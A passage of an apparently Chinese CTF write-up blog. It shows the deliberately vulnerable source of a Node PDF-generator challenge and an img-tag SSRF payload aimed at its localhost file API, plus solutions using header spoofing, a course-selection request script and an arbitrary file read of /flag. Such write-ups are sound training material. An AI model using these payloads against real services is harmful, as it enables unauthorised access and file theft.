class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">``</span><span class="hljs-string">`</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">## secrets_of_admin</span><br><span class="hljs-string"></span><br><span class="hljs-string">`</span><span class="hljs-string">``</span>js<br><span class="hljs-comment">//index.ts</span><br><br><span class="hljs-keyword">const</span> readFile = <span class="hljs-title function_">promisify</span>(fs.<span class="hljs-property">readFile</span>)<br><br><span class="hljs-keyword">const</span> getCheckSum = (<span class="hljs-attr">filename</span>: string): <span class="hljs-title class_">Promise</span>&lt;string&gt; =&gt; &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">const</span> shasum = crypto.<span class="hljs-title function_">createHash</span>(<span class="hljs-string">&#x27;md5&#x27;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">const</span> s = fs.<span class="hljs-title function_">createReadStream</span>(path.<span class="hljs-title function_">join</span>(__dirname , <span class="hljs-string">&quot;../files/&quot;</span>, filename));<br>            s.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> &#123;<br>                shasum.<span class="hljs-title function_">update</span>(data)<br>            &#125;)<br>            s.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(shasum.<span class="hljs-title function_">digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>));<br>            &#125;)<br>        &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>            <span class="hljs-title function_">reject</span>(err)<br>        &#125;<br>    &#125;)<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">checkAuth</span> = (<span class="hljs-params">req: Request, res:Response, next:NextFunction</span>) =&gt; &#123;<br>    <span class="hljs-keyword">let</span> token = req.<span class="hljs-property">signedCookies</span>[<span class="hljs-string">&#x27;token&#x27;</span>]<br>    <span class="hljs-keyword">if</span> (token &amp;&amp; token[<span class="hljs-string">&quot;username&quot;</span>]) &#123;<br>        <span class="hljs-keyword">if</span> (token.<span class="hljs-property">username</span> === <span class="hljs-string">&#x27;superuser&#x27;</span>)&#123;<br>            <span class="hljs-title function_">next</span>(<span class="hljs-title function_">createError</span>(<span class="hljs-number">404</span>)) <span class="hljs-comment">// superuser is disabled since you can&#x27;t even find it in database :)</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (token.<span class="hljs-property">isAdmin</span> === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-title function_">next</span>();<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>)<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_">next</span>(<span class="hljs-title function_">createError</span>(<span class="hljs-number">404</span>));<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">const</span> router = express.<span class="hljs-title class_">Router</span>();<br><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">_, res</span>) =&gt;</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">message</span>: <span class="hljs-string">`Only admin&#x27;s function is implemented. 😖 `</span>&#125;))<br><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>    <span class="hljs-keyword">let</span> &#123; username, password &#125; = req.<span class="hljs-property">body</span>;<br>    <span class="hljs-keyword">if</span> ( username &amp;&amp; password) &#123;<br>        <span class="hljs-keyword">if</span> ( username == <span class="hljs-string">&#x27;&#x27;</span> || <span class="hljs-title function_">typeof</span>(username) !== <span class="hljs-string">&quot;string&quot;</span> || password == <span class="hljs-string">&#x27;&#x27;</span> || <span class="hljs-title function_">typeof</span>(password) !== <span class="hljs-string">&quot;string&quot;</span> ) &#123;<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Parameters error 👻&#x27;</span>&#125;);<br>        &#125;<br>        <span class="hljs-keyword">let</span> data = <span class="hljs-keyword">await</span> <span class="hljs-variable constant_">DB</span>.<span class="hljs-title class_">Login</span>(username, password)<br>        <span class="hljs-keyword">if</span>(!data) &#123;<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; error : <span class="hljs-string">&#x27;You are not admin 😤&#x27;</span>&#125;);<br>        &#125;<br>        res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&#x27;token&#x27;</span>, &#123;<br>            <span class="hljs-attr">username</span>: username,<br>            <span class="hljs-attr">isAdmin</span>: <span class="hljs-literal">true</span> <br>        &#125;, &#123; <span class="hljs-attr">signed</span>: <span class="hljs-literal">true</span> &#125;)<br>        res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/admin&#x27;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; error : <span class="hljs-string">&#x27;Parameters cannot be blank 😒&#x27;</span>&#125;);<br>    &#125;<br>&#125;)<br><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/admin&#x27;</span>, checkAuth, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>    <span class="hljs-keyword">let</span> token = req.<span class="hljs-property">signedCookies</span>[<span class="hljs-string">&#x27;token&#x27;</span>];<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> files = <span class="hljs-keyword">await</span> <span class="hljs-variable constant_">DB</span>.<span class="hljs-title function_">listFile</span>(token.<span class="hljs-property">username</span>);<br>        <span class="hljs-keyword">if</span> (files) &#123;<br>            res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&#x27;token&#x27;</span>, &#123;<span class="hljs-attr">username</span>: token.<span class="hljs-property">username</span>, <span class="hljs-attr">files</span>: files, <span class="hljs-attr">isAdmin</span>: <span class="hljs-literal">true</span> &#125;, &#123; <span class="hljs-attr">signed</span>: <span class="hljs-literal">true</span> &#125;)<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, &#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Something wrong ... 👻&#x27;</span>&#125;)<br>    &#125;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;admin&#x27;</span>);<br>&#125;);<br><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/admin&#x27;</span>, checkAuth, <span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> &#123; content &#125; = req.<span class="hljs-property">body</span>;<br>    <span class="hljs-keyword">if</span> ( content == <span class="hljs-string">&#x27;&#x27;</span> || content.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;&lt;&#x27;</span>) || content.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>) || content.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;/&#x27;</span>) || content.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;script&#x27;</span>) || content.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;on&#x27;</span>))&#123;<br>        <span class="hljs-comment">// even admin can&#x27;t be trusted right ? :)  </span><br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, &#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Forbidden word 🤬&#x27;</span>&#125;);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">let</span> template = <span class="hljs-string">`</span><br><span class="hljs-string">        &lt;html&gt;</span><br><span class="hljs-string">        &lt;meta charset=&quot;utf8&quot;&gt;</span><br><span class="hljs-string">        &lt;title&gt;Create your own pdfs&lt;/title&gt;</span><br><span class="hljs-string">        &lt;body&gt;</span><br><span class="hljs-string">        &lt;h3&gt;<span class="hljs-subst">$&#123;content&#125;</span>&lt;/h3&gt;</span><br><span class="hljs-string">        &lt;/body&gt;</span><br><span class="hljs-string">        &lt;/html&gt;</span><br><span class="hljs-string">        `</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">const</span> filename = <span class="hljs-string">`<span class="hljs-subst">$&#123;uuid()&#125;</span>.pdf`</span><br>            pdf.<span class="hljs-title function_">create</span>(template, &#123;<br>                <span class="hljs-string">&quot;format&quot;</span>: <span class="hljs-string">&quot;Letter&quot;</span>,<br>                <span class="hljs-string">&quot;orientation&quot;</span>: <span class="hljs-string">&quot;portrait&quot;</span>,<br>                <span class="hljs-string">&quot;border&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,<br>                <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;pdf&quot;</span>,<br>                <span class="hljs-string">&quot;renderDelay&quot;</span>: <span class="hljs-number">3000</span>,<br>                <span class="hljs-string">&quot;timeout&quot;</span>: <span class="hljs-number">5000</span><br>            &#125;).<span class="hljs-title function_">toFile</span>(<span class="hljs-string">`./files/<span class="hljs-subst">$&#123;filename&#125;</span>`</span>, <span class="hljs-keyword">async</span> (err, _) =&gt; &#123;<br>                <span class="hljs-keyword">if</span> (err) <span class="hljs-title function_">next</span>(<span class="hljs-title function_">createError</span>(<span class="hljs-number">500</span>));<br>                <span class="hljs-keyword">const</span> checksum = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getCheckSum</span>(filename);<br>                <span class="hljs-keyword">await</span> <span class="hljs-variable constant_">DB</span>.<span class="hljs-title class_">Create</span>(<span class="hljs-string">&#x27;superuser&#x27;</span>, filename, checksum)<br>                <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, &#123; message : <span class="hljs-string">`Your pdf is successfully saved 🤑 You know how to download it right?`</span>&#125;);<br>            &#125;);<br>        &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, &#123; error : <span class="hljs-string">&#x27;Failed to generate pdf 😥&#x27;</span>&#125;)<br>        &#125;<br>    &#125;<br>&#125;);<br><br><span class="hljs-comment">// You can also add file logs here!</span><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/files&#x27;</span>, <span class="hljs-keyword">async</span> (req, res, next) =&gt; &#123;<br>    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">socket</span>.<span class="hljs-property">remoteAddress</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^.*:/</span>, <span class="hljs-string">&#x27;&#x27;</span>) != <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">next</span>(<span class="hljs-title function_">createError</span>(<span class="hljs-number">401</span>));<br>    &#125;<br>    <span class="hljs-keyword">let</span> &#123; username , filename, checksum &#125; = req.<span class="hljs-property">query</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">typeof</span>(username) == <span class="hljs-string">&quot;string&quot;</span> &amp;&amp; <span class="hljs-title function_">typeof</span>(filename) == <span class="hljs-string">&quot;string&quot;</span> &amp;&amp; <span class="hljs-title function_">typeof</span>(checksum) == <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">await</span> <span class="hljs-variable constant_">DB</span>.<span class="hljs-title class_">Create</span>(username, filename, checksum)<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Done&#x27;</span>)<br>        &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Error!&#x27;</span>)<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Parameters error&#x27;</span>)<br>    &#125;<br>&#125;);<br><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/files/:id&#x27;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>    <span class="hljs-keyword">let</span> token = req.<span class="hljs-property">signedCookies</span>[<span class="hljs-string">&#x27;token&#x27;</span>]<br>    <span class="hljs-keyword">if</span> (token &amp;&amp; token[<span class="hljs-string">&#x27;username&#x27;</span>]) &#123;<br>        <span class="hljs-keyword">if</span> (token.<span class="hljs-property">username</span> == <span class="hljs-string">&#x27;superuser&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Superuser is disabled now&#x27;</span>);   <br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">let</span> filename = <span class="hljs-keyword">await</span> <span class="hljs-variable constant_">DB</span>.<span class="hljs-title function_">getFile</span>(token.<span class="hljs-property">username</span>, req.<span class="hljs-property">params</span>.<span class="hljs-property">id</span>)<br>            <span class="hljs-keyword">if</span> (fs.<span class="hljs-title function_">existsSync</span>(path.<span class="hljs-title function_">join</span>(__dirname , <span class="hljs-string">&quot;../files/&quot;</span>, filename)))&#123;<br>                <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-keyword">await</span> <span class="hljs-title function_">readFile</span>(path.<span class="hljs-title function_">join</span>(__dirname , <span class="hljs-string">&quot;../files/&quot;</span>, filename)));<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;No such file!&#x27;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Error!&#x27;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>);<br>    &#125;<br>&#125;);<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> router;<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">comment<span class="hljs-selector-attr">[]</span>=&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;http://127.0.0.1:8888/api/files?username=admin&amp;filename=./flag&amp;checksum=111&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><h2 id="Package-Manager-2021"><a href="#Package-Manager-2021" class="headerlink" title="Package Manager 2021"></a>Package Manager 2021</h2>]]></content>
    
    
    
    <tags>
      
      <tag>做题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计院冬令营_week1-week4</title>
    <link href="/2024/03/01/ezHTTP/"/>
    <url>/2024/03/01/ezHTTP/</url>
    
    <content type="html"><![CDATA[<p>一些做题记录</p><span id="more"></span><hr><h2 id="HGAME-ezHTTP"><a href="#HGAME-ezHTTP" class="headerlink" title="[HGAME]ezHTTP"></a>[HGAME]ezHTTP</h2><p>请从vidar.club访问这个页面：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Referer:</span> vidar.club<br></code></pre></td></tr></table></figure><p>请通过Mozilla&#x2F;5.0 (Vidar; VidarOS x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;121.0.0.0 Safari&#x2F;537.36 Edg&#x2F;121.0.0.0访问此页:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Vidar; VidarOS x86_64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">121.0.0.0</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> Edg/<span class="hljs-number">121.0.0.0</span><br></code></pre></td></tr></table></figure><p>请从本地访问这个页面：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-REAL-IP: <span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p><img src="/img/HGAME2024EZHTTP.png" alt="HGAME2024EZHTTP"></p><p>解码即可：<code>hgame&#123;HTTP_!s_1mP0rT4nt&#125;</code></p><h2 id="HGAME-Bypass-it"><a href="#HGAME-Bypass-it" class="headerlink" title="[HGAME]Bypass it"></a>[HGAME]Bypass it</h2><p>This page requires javascript to be enabled :)</p><p>首页的注册页面未开放：</p><p><img src="/img/hgame2024bypassit1.png" alt="hgame2024bypassit1"></p><p>结合题目提示想到可能要利用禁用<code>javascript</code>，直接<code>about:config</code>设置<code>javascript.enabled</code>为<code>False</code>，然后发现能正常注册，随便注册一个登录：</p><p><img src="/img/hgame2024bypassit2.png" alt="hgame2024bypassit2"></p><p>点击这个<code>Click here</code>即可：</p><p><code>hgame&#123;8840bb090e756adf6ac99e7728d818b37fe9ff89&#125;</code></p><h2 id="HGAME-Select-Courses"><a href="#HGAME-Select-Courses" class="headerlink" title="[HGAME]Select Courses"></a>[HGAME]Select Courses</h2><p>选课脚本，不同的课是以<code>POST</code>形式发送，数据类似<code>&#123;&quot;id&quot;:1&#125;</code>这种：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>myurl = <span class="hljs-string">&#x27;http://47.100.137.175:30962/api/courses&#x27;</span><br>myheaders=&#123;<br><span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0&#x27;</span>,<br><span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;*/*&#x27;</span>,<br><span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,<br><span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;gzip, deflate&#x27;</span>,<br><span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;http://47.100.137.175:30962/&#x27;</span>,<br><span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,<br><span class="hljs-string">&#x27;Content-Length&#x27;</span>: <span class="hljs-string">&#x27;8&#x27;</span>,<br><span class="hljs-string">&#x27;Origin&#x27;</span>: <span class="hljs-string">&#x27;http://47.100.137.175:30962&#x27;</span>,<br><span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;close&#x27;</span>,<br><span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;PHPSESSID=87e44290983eb0edfb8bc10c06cbc07f&#x27;</span><br>&#125;<br>success_count = <span class="hljs-number">0</span>  <br>selected_courses = []  <br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">for</span> course_id <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>):<br>        <span class="hljs-keyword">if</span> course_id <span class="hljs-keyword">in</span> selected_courses:<br>            <span class="hljs-keyword">continue</span>  <br><br>        payload = <span class="hljs-string">f&#x27;&#123;&#123;&quot;id&quot;:<span class="hljs-subst">&#123;course_id&#125;</span>&#125;&#125;&#x27;</span><br>        resp = requests.post(url=myurl, headers=myheaders, data=payload)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;full&quot;:0&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>            success_count += <span class="hljs-number">1</span><br>            selected_courses.append(course_id)  <br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;第<span class="hljs-subst">&#123;course_id&#125;</span>门选课成功&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> success_count == <span class="hljs-number">5</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;五门课程都选课成功，跳出循环&quot;</span>)<br>        myurl = <span class="hljs-string">&#x27;http://47.100.137.175:30962/api/ok&#x27;</span><br>        resp = requests.get(url=myurl, headers=myheaders)<br>        <span class="hljs-built_in">print</span>(resp.text)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p><img src="/img/hgame2024sc1.png" alt="hgame2024sc1"></p><p><code>flag:hgame&#123;w0W_!_1E4Rn_To_u5e_5cripT_^_^&#125;</code></p><h2 id="BeginCTF-zupload"><a href="#BeginCTF-zupload" class="headerlink" title="[BeginCTF]zupload"></a>[BeginCTF]zupload</h2><p>index.php存在任意文件读取：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: /?action=upload&#x27;</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])); <span class="hljs-comment">//这里</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>,<br>        <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;Not implemented yet&#x27;</span><br>    ));<br>&#125;<br></code></pre></td></tr></table></figure><p>所以直接<code>/?action=/flag</code>就行</p><p><code>begin&#123;Ju57_r3AD_d70eba21d9d8&#125;</code></p><h2 id="BeginCTF-zupload-pro"><a href="#BeginCTF-zupload-pro" class="headerlink" title="[BeginCTF]zupload-pro"></a>[BeginCTF]zupload-pro</h2><p><code>index.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;GET&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: /?action=upload&#x27;</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;/&#x27;</span> || <span class="hljs-title function_ invoke__">strpos</span>(<span 